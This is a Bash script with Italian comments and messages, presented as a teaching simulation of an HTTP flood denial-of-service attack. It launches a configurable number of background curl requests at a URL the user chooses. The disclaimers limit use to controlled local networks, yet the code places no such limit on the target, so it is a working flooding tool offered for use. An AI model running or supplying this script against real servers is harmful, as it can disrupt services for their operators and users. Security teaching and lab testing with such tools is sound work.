#!/bin/bash

# ============================================================================
# Simulazione didattica di attacco DoS (HTTP Flood) verso server vulnerabili
# ============================================================================
# ATTENZIONE: Usare solo in rete locale controllata e a scopo educativo!
# ============================================================================

# Colori per output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Funzione per stampare messaggi di avvertenza
print_warning() {
    echo -e "${YELLOW}[!] AVVISO: Questo script è solo per scopi didattici!${NC}"
    echo -e "${YELLOW}[!] Utilizzare esclusivamente in ambienti controllati.${NC}"
    echo -e "${YELLOW}[!] L'autore non è responsabile per un uso improprio.${NC}"
    echo ""
}

# Funzione per mostrare l'uso dello script
usage() {
    echo "Utilizzo: $0 -t <TARGET_URL> -r <REQUESTS> -d <DELAY>"
    echo ""
    echo "Opzioni:"
    echo "  -t, --target    URL del bersaglio (es: http://192.168.100.20)"
    echo "  -r, --requests  Numero totale di richieste da inviare (default: 100)"
    echo "  -d, --delay     Ritardo tra le richieste in secondi (default: 0.05)"
    echo "  -h, --help      Mostra questo messaggio"
    echo ""
    echo "Esempio:"
    echo "  $0 -t http://192.168.100.20 -r 1000 -d 0.01"
}

# Controlla se sono installati i tool necessari
check_dependencies() {
    if ! command -v curl &> /dev/null; then
        echo -e "${RED}[!] curl non è installato.${NC}"
        echo "Installalo con: sudo apt install curl"
        exit 1
    fi
}

# Invia le richieste HTTP
http_flood() {
    local TARGET=$1
    local REQUESTS=$2
    local DELAY=$3

    echo -e "${GREEN}[+] Inizio simulazione HTTP Flood${NC}"
    echo -e "${GREEN}[+] Bersaglio: $TARGET${NC}"
    echo -e "${GREEN}[+] Richieste: $REQUESTS${NC}"
    echo -e "${GREEN}[+] Ritardo: $DELAY secondi${NC}"
    echo ""

    for i in $(seq 1 $REQUESTS); do
        # Esegue la richiesta HTTP in background
        curl -s -o /dev/null "$TARGET" &
        
        # Stampa lo stato ogni 100 richieste
        if [ $((i % 100)) -eq 0 ]; then
            echo -e "${GREEN}[+] Richieste inviate: $i${NC}"
        fi
        
        # Attende il ritardo specificato
        sleep $DELAY
    done

    # Attende che tutti i processi curl in background terminino
    wait
    echo -e "${GREEN}[+] Simulazione completata. Tutte le richieste sono state inviate.${NC}"
}

# Main
main() {
    local TARGET=""
    local REQUESTS=100
    local DELAY=0.05

    # Mostra avvertenza
    print_warning

    # Parsing degli argomenti
    while [[ $# -gt 0 ]]; do
        case $1 in
            -t|--target)
                TARGET="$2"
                shift
                shift
                ;;
            -r|--requests)
                REQUESTS="$2"
                shift
                shift
                ;;
            -d|--delay)
                DELAY="$2"
                shift
                shift
                ;;
            -h|--help)
                usage
                exit 0
                ;;
            *)
                echo -e "${RED}[!] Opzione sconosciuta: $1${NC}"
                usage
                exit 1
                ;;
        esac
    done

    # Verifica che il target sia stato specificato
    if [[ -z "$TARGET" ]]; then
        echo -e "${RED}[!] Specificare un target con l'opzione -t${NC}"
        usage
        exit 1
    fi

    # Verifica che le richieste e il delay siano numeri
    if ! [[ $REQUESTS =~ ^[0-9]+$ ]]; then
        echo -e "${RED}[!] Il numero di richieste deve essere un intero positivo.${NC}"
        exit 1
    fi

    if ! [[ $DELAY =~ ^[0-9]+(\.[0-9]+)?$ ]]; then
        echo -e "${RED}[!] Il ritardo deve essere un numero.${NC}"
        exit 1
    fi

    # Controlla le dipendenze
    check_dependencies

    # Conferma l'avvio
    echo -e "${YELLOW}[?] Premi INVIO per iniziare l'attacco o CTRL+C per annullare...${NC}"
    read

    # Avvia l'HTTP Flood
    http_flood "$TARGET" "$REQUESTS" "$DELAY"
}

# Avvia lo script solo se eseguito direttamente
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    main "$@"
fi
